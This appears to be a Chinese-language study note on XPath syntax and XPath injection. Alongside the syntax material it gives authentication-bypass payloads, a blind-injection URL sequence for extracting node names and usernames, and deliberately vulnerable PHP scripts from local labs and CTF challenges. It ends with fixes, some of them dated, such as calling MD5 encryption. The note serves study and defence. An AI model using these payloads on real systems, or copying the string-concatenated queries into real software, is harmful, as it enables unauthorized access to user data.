---
学习目标: xpath

typora-copy-images-to: media
typora-root-url: ./media

---

# 1. 基础理论

## 1.1. xpath

>  维基百科的定义：
>
> XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的计算机语言。
> XPath基于XML的树状结构，提供在数据结构树中找寻节点的能力。起初XPath的提出的初衷是将其作为一个通用的、介于XPointer与XSL间的语法模型。但是XPath很快的被开发者采用来当作小型查询语言。



## 1.2. xpath表达式

最常见的XPath表达式是路径表达式（XPath这一名称的另一来源）。路径表达式是从一个XML节点（当前的上下文节点）到另一个节点、或一组节点的书面步骤顺序。这些步骤以“/”字符分开，每一步有三个构成成分：

- `轴描述`（用最直接的方式接近目标节点）
- `节点测试`（用于筛选节点位置和名称）
- `节点描述`（用于筛选节点的属性和子节点特征）

一般情况下，我们使用简写后的语法。虽然完整的轴描述是一种更加贴近人类语言，利用自然语言的单词和语法来书写的描述方式，但是相比之下也更加罗嗦。

> 简略的语法
>
> 最简单的XPath如下：
>
> - `/A/B/C`
>
> 在这里选择所有符合规矩的C节点：C节点必须是B的子节点（`B/C`），同时B节点必须是A的子节点（`A/B`），而A是这个XML文档的根节点（`/A`）。此时的这种描述法类似于磁盘中文件的路径（`URI`），从盘符开始顺着一级一级的目录最终找到文件。这里还有一个复杂一些的例子，包含了全部构成成分（请详细的看）：
>
> - `A//B/*[1]`
>
> 此时选择的元素是：在B节点下的第一个节点（`B/*[1]`），不论节点的名称如何（`*`）；而B节点必须出现在A节点内，不论和A节点之间相隔几层节点（`//B`）；与此同时A节点还必须是当前节点的子节点（`A`，前边没有`/`）。

> 扩展的语法
>
> 在未缩简语法里，两个上述范例可以写为：
>
> - `/child::A/child::B/child::C`
> - `child::A/descendant-or-self::B/child::node()[1]`
>
> 在XPath的每个步骤里，通过完整的轴描述（例如：`child`或`descendant-or-self`）进行明确的指定，然后使用`::`，它的后面跟着节点测试的内容，例如上面范例所示的`A`以及`node()`。

### 1.2.1. 轴描述

轴描述元表示XML文件分支树表达式的浏览方向。这些坐标──包括全名及缩写语法──列举如下：

| 坐标               | 名称               | 说明                                                     | 缩写语法     |
| ------------------ | ------------------ | -------------------------------------------------------- | ------------ |
| child              | 子节点             | 比自身节点深度大的一层的节点，且被包含在自身之内         | 默认，不需要 |
| attribute          | 属性               |                                                          | @            |
| descendant         | 子孙节点           | 比自身节点深度大的节点，且被包含在自身之内               | 不提供       |
| descendant-or-self | 自身引用及子孙节点 |                                                          | //           |
| parent             | 父节点             | 比自身节点深度小一层的节点，且包含自身                   | ..           |
| ancestor           | 祖先节点           | 比自身节点深度小的节点，且包含自身                       | 不提供       |
| ancestor-or-self   | 自身引用及祖先节点 |                                                          | 不提供       |
| following          | 下文节点           | 按纵轴视图，在此节点后的所有完整节点，即不包含其祖先节点 | 不提供       |
| preceding          | 前文节点           | 按纵轴视图，在此节点前的所有完整节点，即不包含其子孙节点 | 不提供       |
| following-sibling  | 下一个同级节点     |                                                          | 不提供       |
| preceding-sibling  | 上一个同级节点     |                                                          | 不提供       |
| self               | 自己               |                                                          | .            |
| namespace          | 名称空间           |                                                          | 不提供       |

关于使用attribute坐标简写语法的一个范例，//a/@href在文件树里任何地方的元素下选择了一个叫href的属性。self坐标最通常与述语同用，以参考现行选定节点。例如，h3[.='See also']在现行上下文选取了叫h3的元素，该元素文字内容是See also。

### 1.2.2. 节点测试
节点测试包括特定节点名或者更一般的表达式。至于XML里名字空间前缀gs已定义的文件，//gs:enquiry将找到所有在那名字空间里enquiry的节点。

其他节点格式：

comment():寻找XML注释节点，例如<!-- 注释 -->
text():寻找某点的文字体别，例如hello于<k>hello</k>
processing-instruction():寻找XML处理指令如<?php echo $a; ?>。在这个例子里，将符合processing-instruction('php')会传回值。
node(): 寻找所有点

### 1.2.3. 节点描述

节点描述为一个逻辑真假表达式，任何真假判断表达式都可在节点后方括号里表示，这条件必须在XPath处理这个节点前先被满足。在某一步骤可有多少个描述并没有限制。
范例如下： //a[@href='help.php']，这将检查元素a有没有href属性，并且该它的值是help.php。
复杂一些的范例如下：
`//a[@href='help.php'][../div/@class='header']/@target`
或
`//a[@href='help.php'][name(..)='div'][../@class='header']/@target`
此例将会选择符合条件的元素a的target属性。 要求元素a：
具有属性href且值为help.php；
并且元素a具有父元素div；
并且父元素（div）其自身具备class属性，值为header。

## 1.3. 函数与运算符

XPath 1.0定义四种数据型别：节点型（本身无序的节点组）、字符串型、数字体(数值)、与布尔型。

有效的运算符有：

- `/`、`//`以及`..`运算符，一般用于轴描述。
- 合集运算符 `| `把两个节点形成联集。
- 布尔运算符`and`、`or`以及`not()`函数
- 数学运算符 `+`、`-`、`*`、`div`（除）以及`mod`（取余数）
- 比较操作子 `=`、`!=`（不等于）、`<`、`>`、`<=`、`>=`

函数有：

- 文字运算函数：concat(), substring(), contains(), substring-before(), substring-after(), translate(), normalize-space(), string-length()
- 数学运算函数：sum(), round(), floor(), ceiling()
- 节点属性获取函数：name(), local-name(), namespace-uri()
- 处理上下文数据获取函数：position(), last()
- 类型转换函数：string(), number(), boolean()

某些常用的函数详列如下。完整明细请参照[W3C建议书](https://web.archive.org/web/20121209085946/http://www.w3.org/TR/xpath/)。

### 1.3.1. 节点组函数

- position()

  返回当前节点集合内，该节点的位置。

- count(*node-set*)

  返回符合XPath的节点集合的节点总数。

### 1.3.2. 字符串函数

- string(*object*?)

  根据内建法则转换任何四种XPath数据型别为字符串。参数可为XPath，此时符合条件的节点（群）被转换成字符串返回。

- concat(*string*, *string*, *string**)

  链接任何数量的字符串。

- contains(*s1*, *s2*)

  如果`s1`包含`s2`返回真。

- normalize-space(*string*?)

  所有在字符串头和尾的空白字符都被移除，或者将字符间两个及以上的空白字符置换成单一空格。有些XML因打印关系被美化，但可能让后来的字符串处理结果不可靠，故使用此函数有时能很好地改善情况。

### 1.3.3. 布尔函数

- not(*boolean*)

  布尔否运算函数。

### 1.3.4. 数学运算函数

- sum(*node-set*)

  根据内建转型规则，转换所有XPath参数定义找到的节点字符串值成为数字，然后返回这些数字总合

使用操作子：`=, !=, <=, <, >=`和`>`的表达式可以创造于术语内。布尔表达式可用括号`()`、布尔操作子`and`与`or`、和／或者上述的`not()`函数联合起来。数值计算使用`*, +, -, div`和`mod`。字符串可包含任何[Unicode](https://zh.wikipedia.org/wiki/Unicode)字符。

述语内外，整个节点组可利用"|"字符联合起来。

`v[x or y] | w[z]`会返回单一节点组，包括现行上下文找到的所有拥有`x`或`y`子元素的`v`元素、有`z`子元素的`w`元素。

`//item[@price > 2*@discount]`会选取price属性至少两倍于discount属性数值的对象

## 1.4. XPath 2及XPath 3

在W3C建议下，XPath 1.0于1999年11月16日发表。XPath 2.0于2007年1月23日成为W3C推荐标准。XPath 2.0表达了XPath语言在大小与能力上显著的增加。
最值得大书特书的改变是XPath 2.0有了更丰富的型别系统；XPath 2.0支持不可分割型态，如在XML Schema内建型态定义一样，并且也可自纲要（schema）导入用户自定型别。现在每个值都是一个序列（一个单一不可分割值或节点都被视为长度一的序列）。XPath 1.0节点组被节点序列取代，它可以是任何顺序。
为了支持更丰富的型别组，XPath 2.0提供相当延展的函数与操作子群。
XPath 2.0实际上是XQuery 1.0的子集合。它提供了一个for表达式。该式是XQuery里“FLWOR”表达式的缩减版。利用列出XQuery省去的部分来描述该语言是可能的。主要范例是查询前导语（query prolog）、元素和属性建构式、“FLWOR”语法的余项式、以及typeswitch表达式。
XPath 3.0于2014年4月8日成为W3C推荐标准，而XPath3.1则于2017年3月21日成为W3C推荐标准。

## 1.5. XPATH基础语法

### 1.5.1. 查询基本语句

> `//users/user[loginID/text()=’abc’ and password/text()=’test123’]`。
>
> 这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：' or 1=1 并在 password 中输入：' or 1=1  就能绕过校验，成功获取所有user数据
>
> `//users/user[LoginID/text()='' or 1=1 and password/text()='' or 1=1]`

### 1.5.2. 节点类型

> ## 节点类型
>
> 在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或称为根节点）。 文档的根节点即是文档结点；对应属性有属性结点，元素有元素结点。
>
> element (元素)
> attribute (属性)
> text (文本)
> namespace (命名空间)
> processing-instruction (处理指令)
> comment (注释)
> root (根节点)

~~~xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bookstore>
	<book>
		<title lang="en">Harry Potter</title>
		<author>J K. Rowling</author>
		<year>2005</year>
		<price>29.99</price>
	</book>
</bookstore>

<!--
<bookstore>根节点
<author>J K. Rowling</author>    元素节点
lang="en"属性节点
-->
~~~

### 1.5.3. 表达式

XPath通过路径表达式(Path Expression)来选取节点,基本规则:

| 表达式   | 描述                                                     |
| -------- | -------------------------------------------------------- |
| nodename | 选取此节点的所有子节点                                   |
| /        | 从根节点选取                                             |
| //       | 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置 |
| .        | 选取当前节点                                             |
| ..       | 选取当前节点的父节点                                     |
| @        | 选取属性或　@*：匹配任何属性节点                         |
| *        | 匹配任何元素节点                                         |

来看一个XML实例

~~~xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bookstore>
	<book>
		<title lang="eng">Harry Potter</title>
		<price>29.99</price>
	</book>
	<book>
		<title lang="eng">Learning XML</title>
		<price>39.95</price>
	</book>
</bookstore>
~~~

| 表达式          | 结果                                                         |
| --------------- | ------------------------------------------------------------ |
| bookstore       | 选取 bookstore 元素的所有子节点                              |
| /bookstore      | 选取根元素 bookstore                                         |
| bookstore/book  | 选取属于 bookstore 的子元素的所有 book 元素                  |
| //book          | 选取所有 book 子元素,而不管它们在文档中的位置                |
| bookstore//book | 选择属于 bookstore 元素的后代的所有 book 元素,而不管它们位于 bookstore 之下的什么位置 |
| //@lang         | 选取名为 lang 的所有属性                                     |

### 1.5.4. 限定语

限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中.
路径表达式结果：

| 表达式                             | 结果                                                         |
| ---------------------------------- | ------------------------------------------------------------ |
| /bookstore/book[1]                 | 选取属于 bookstore 子元素的第一个 book 元素                  |
| /bookstore/book[last()]            | 选取属于 bookstore 子元素的最后一个 book 元素                |
| //title[@lang]                     | 选取所有拥有名为 lang 的属性的 title 元素                    |
| //title[@lang=’eng’]               | 选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性     |
| /bookstore/book[price>35.00]/title | 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00 |

### 1.5.5. 通配符

XPath 通配符可用来选取未知的 XML 元素.

| 通配符 | 描述               |
| ------ | ------------------ |
| *      | 匹配任何元素节点   |
| @*     | 匹配任何属性节点   |
| node() | 匹配任何类型的节点 |

实例

| 表达式       | 结果                            |
| ------------ | ------------------------------- |
| /bookstore/* | 选取 bookstore 元素的所有子元素 |
| //*          | 选取文档中的所有元素            |
| //title[@*]  | 选取所有带有属性的 title 元素   |

### 1.5.6. 选取多个路径

可以在路径表达式中使用”|”运算符来选取若干路径.

实例:

| 表达式                          | 结果                                                         |
| ------------------------------- | ------------------------------------------------------------ |
| //book/title \| //book/price    | 选取 book 元素的所有 title 和 price 元素                     |
| bookstore/book/title \| //price | 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素 |

### 1.5.7. 运算符

路径表达式中可以使用一些常见的数学运算符和逻辑运算符,

### 1.5.8. 函数

| 名称               | 结果                                                     |
| ------------------ | -------------------------------------------------------- |
| ancestor           | 选取当前节点的所有先辈（父、祖父等）                     |
| ancestor-or-self   | 选取当前节点的所有先辈（父、祖父等）以及当前节点本身     |
| attribute          | 选取当前节点的所有属性                                   |
| child              | 选取当前节点的所有子元素。                               |
| descendant         | 选取当前节点的所有后代元素（子、孙等）。                 |
| descendant-or-self | 选取当前节点的所有后代元素（子、孙等）以及当前节点本身。 |
| following          | 选取文档中当前节点的结束标签之后的所有节点。             |
| namespace          | 选取当前节点的所有命名空间节点                           |
| parent             | 选取当前节点的父节点。                                   |
| preceding          | 选取文档中当前节点的开始标签之前的所有节点。             |
| preceding-sibling  | 选取当前节点之前的所有同级节点。                         |
| self               | 选取当前节点。                                           |

路径表达式可以是绝对路径，也可以是相对路径。例如：

**绝对位置路径：**

/step/step/...

**相对位置路径：**

step/step/...

其中的每一步又可以是一个表达式，包括：

轴（函数）（axis）：定义所选节点与当前节点之间的树关系

节点测试（node-test）：识别某个轴内部的节点

零个或者更多谓语（predicate）：更深入地提炼所选的节点集

| 例子                   | 结果                                                         |
| ---------------------- | ------------------------------------------------------------ |
| child::book            | 选取所有属于当前节点的子元素的 book 节点                     |
| attribute::lang        | 选取当前节点的 lang 属性                                     |
| child::*               | 选取当前节点的所有子元素                                     |
| attribute::*           | 选取当前节点的所有属性                                       |
| child::text()          | 选取当前节点的所有文本子节点                                 |
| child::node()          | 选取当前节点的所有子节点                                     |
| descendant::book       | 选取当前节点的所有 book 后代                                 |
| ancestor::book         | 选择当前节点的所有 book 先辈                                 |
| ancestor-or-self::book | 选取当前节点的所有book先辈以及当前节点（假如此节点是book节点的话） |
| child::*/child::price  | 选取当前节点的所有 price 孙。                                |

## 1.6 xpath注入

> XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。

### 1.6.1. xpath注入的原理

xpath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 XML 数据被用于用户认证，那么攻击者就可以提升他的权限。因为xpath不存在访问控制，所以我们不会遇到许多在SQL注入中经常遇到的访问限制。XML 中没有访问控制或者用户认证，如果用户有权限使用 XPath 查询，并且之间没有防御系统或者查询语句没有被防御系统过滤，那么用户就能够访问整个 XML 文档。 注入出现的位置也就是cookie，headers，request parameters/input等。下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。

  在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问.

1. 一个例子

   ~~~xml
   <users>
   	<user>
   		<firstname>Ben</firstname>
   		<lastname>Elmore</lastname>
   		<loginID>abc</loginID>
   		<password>test123</password>
   	</user>
   	<user>
   		<firstname>Shlomy</firstname>
   		<lastname>Gantz</lastname>
   		<loginID>xyz</loginID>
   		<password>123test</password>
   	</user>
   ~~~

   则在XPath中其典型的查询语句如下：

   `//users/user[loginID/text()='xyz'and password/text()='123test']`

    但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = 'xyz' 和 password = '123test'，则该查询语句将返回 true。但如果用户传入类似 ' or 1=1 or ''=' 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：

   `//users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''='']`

     这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。延展开来，xpath的注入还有很多花样，像是通过updataxml()函数实现xpth报错注入，还有xpth的盲注



# 2. 漏洞复现

## 2.1. php

主流脚本语言都支持对XPath的处理,下面我以PHP来学习XPath注入的原理。

### 2.1.1. 第一个场景

~~~xml
# score.xml
<?xml version="1.0" encoding="utf-8"?>
<root>
	<class num='1'>
		<peo name='tom'>
			<subject>
				<foo>english</foo>
				<score>60</score>
			</subject>
			<subject>
				<foo>chinese</foo>
				<score>70</score>
			</subject>
			<password>qwer123</password>
		</peo>
		<peo name='helen'>
			<subject>
				<foo>english</foo>
				<score>24</score>
			</subject>
			<subject>
				<foo>chinese</foo>
				<score>34</score>
			</subject>
			<password>woaichishi</password>
		</peo>
		<peo name='vk'>
			<subject>
				<foo>english</foo>
				<score>100</score>
			</subject>
			<subject>
				<foo>chinese</foo>
				<score>100</score>
			</subject>
			<password>vk123</password>
		</peo>
	</class>
</root>
~~~

~~~php
# index.php
<?php
if (file_exists('score.xml')) {
    $xml = simplexml_load_file('score.xml');  //获取xml文件里面的数据
    if (isset($_GET['user'])) {
        $user = $_GET['user'];
        //构造语句
        $en_scr = "//peo[@name='{$user}']/subject[contains(foo, 'english')]/score";
        $ch_scr = "//peo[@name='{$user}']/subject[contains(foo, 'chinese')]/score";
        $en_qu = $xml->xpath($en_scr);
        $ch_qu = $xml->xpath($ch_scr);
        foreach ($en_qu as $key => $value) {
            echo $user . ':<br>english is ' . $value;
        }
        foreach ($ch_qu as $key => $value) {
            echo '<br>' . 'chinese is ' . $value;
        }
    } else {
        echo 'only have three user: vk, tom, helen.';
    }
}
~~~

<img src="/image-20211013223837420.png" alt="image-20211013223837420" style="zoom:30%;" align="left"/>

### 2.1.2. 第二个场景

第二个场景使用bwaspp漏洞平台：https://sourceforge.net/projects/bwapp/files/bWAPP/

![image-20211013230855300](/image-20211013230855300.png)

<img src="/image-20211013231608418.png" alt="image-20211013231608418" style="zoom:30%;" align="left"/>

# 3. 高级用法

> XPath盲注的方法
>
> 盲注主要利用XPath的一些字符串操作函数和运算符.



| 函数             | 描述                                                         |
| ---------------- | ------------------------------------------------------------ |
| concat           | 返回参数的串联                                               |
| contains         | 如果第一个参数字符串包含第二个参数字符串，在返回true；否则，返回false。 |
| normalize-space  | 返回去除了空白的参数字符串。                                 |
| starts-with      | 如果第一个参数字符串以第二个参数字符串开头，则返回true；否则，返回false。 |
| string           | 将对象转换为字符串                                           |
| string-length    | 返回字符串中的字符数                                         |
| substring        | 返回第一个参数中从第二个参数指定的位置开始、第三个参数指定长度的字符串。 |
| substring-after  | 返回第一个参数字符串中第一次出现第二个参数字符串之后的子字符串。 |
| substring-before | 返回第一个参数字符串中第一次出现第二个参数字符串之前的子字符串。 |
| translate        | 返回第一个参数字符串，出现第二个参数字符串中的字符的位置替换为第三个参数字符串中对应位置的字符。 |



> 以前文的环境为例,如果我们想遍历出整个XML文档,一般步骤如下:
>
> 1.判断根下节点数:
>
> 127.0.0.1/xpath/index.php?name=1' or count(/*)=1 or '1'='1&pwd=fake
>
> result: 1
>
> 2.猜解第一级节点:
>
> 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),1,1)='r' or '1'='1&pwd=fake
>
> 127.0.0.1/xpath/index.php?name=1' or substring(name(/*[position()=1]),2,1)='o' or '1'='1&pwd=fake
>
> ...
>
> result: root
>
> 3.判断root的下一级节点数:
>
> 127.0.0.1/xpath/index.php?name=1' or count(/root/*)=2 or '1'='1&pwd=fake
>
> result: 2
>
> 4.猜解root的下一级节点:
>
> 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&pwd=fake
>
> 127.0.0.1/xpath/index.php?name=1' or substring(name(/root/*[position()=2]),1,1)='s' or '1'='1&pwd=fake
>
> result: users,secret
>
> 重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.
>
> 猜解id为1的user节点下的username值,
>
> 127.0.0.1/xpath/index.php?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&pwd=fake
>
> ...
>
> result: admin

## 3.1. CTF-01

HCTF-2015

~~~xml
<!--t3stt3st.xml-->
<?xml version="1.0" encoding="utf-8"?>
<root1>
	<user>
		<username name='user1'>user1</username>
		<key>KEY:1</key>            
		<username name='user2'>user2</username>
		<key>KEY:2</key>            
		<username name='user3'>user3</username>
		<key>KEY:3</key>            
		<username name='user4'>user4</username>
		<key>KEY:4</key>            
		<username name='user5'>user5</username>
		<key>KEY:5</key>            
		<username name='user6'>user6</username>
		<key>KEY:6</key>            
		<username name='user7'>user7</username>
		<key>KEY:7</key>            
		<username name='user8'>user8</username>
		<key>KEY:8</key>            
		<username name='user9'>user9</username>
		<key>KEY:9</key>            
	</user>
	<hctfadmin>
		<username name='hctf1'>hctf</username>
		<key>flag:hctf{Dd0g_fac3_t0_k3yboard233}</key>
	</hctfadmin>
</root1>
~~~



~~~php
<?php

$re = array('and','or','count','select','from','union','group','by','limit','insert','where','order','alter','delete','having','max','min','avg','sum','sqrt','rand','concat','sleep');

setcookie('injection','c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=',time()+100000);


if(file_exists('t3stt3st.xml')) {

			$xml = simplexml_load_file('t3stt3st.xml');
			
			$user=$_GET['user'];
			
			$user=str_replace($re, ' ', $user);
			
			//$user=str_replace("'", "&apos", $user);
			
			$query="user/username[@name='".$user."']";
			
			$ans = $xml->xpath($query);

			foreach($ans as $x => $x_value)
			
			{
			
			  echo $x.":  " . $x_value;
			
			   echo "<br />";
			
			}

 }
~~~

![image-20211014001725798](/image-20211014001725798.png)



## 3.2. CTF-02

~~~xml
<!-- blog.xml：-->
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<users>
		<user>
			<id>1</id>
			<username>admin</username>
			<password type="md5">0192023a7bbd73250516f069df18b500</password>
		</user>
		<user>
			<id>2</id>
			<username>jack</username>
			<password type="md5">1d6c1e168e362bc0092f247399003a88</password>
		</user>
		<user>
			<id>3</id>
			<username>tony</username>
			<password type="md5">cc20f43c8c24dbc0b2539489b113277a</password>
		</user>
	</users>
	<secret>
		<flag>flag{My_f1rst_xp4th_iNjecti0n}</flag>
	</secret>
</root>
~~~

~~~php
# index.php:
<?php
$xml = simplexml_load_file('blog.xml');
$name = $_GET['name'];
$pwd = md5($_GET['pwd']);
$query = "/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']";
echo $query;
$result = $xml->xpath($query);
if($result) {
    echo '<h2>Welcome</h2>';
    foreach ($result as $key => $value) {
        echo '<br />ID:'.$value->id;
        echo '<br />Username:'.$value->username;
    }
}
~~~

<img src="/image-20211013182254273.png" alt="image-20211013182254273" style="zoom: 30%;" align="left"/>





# 4. 修复意见

> 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。
>
> \2.  检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换
>
> \3.  对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类）
>
> 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。。如下代码可以通过创建保存查询的外部文件使查询参数化：
>
>   declare variable $loginID as xs：string external；
>
>   declare variable $password as xs：string external；
>
>   //users/user[@loginID=$loginID and@password= $password]
>
> \4.  通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。
>
> \5.  验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。
>
> 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量

# 5. 遗留问题

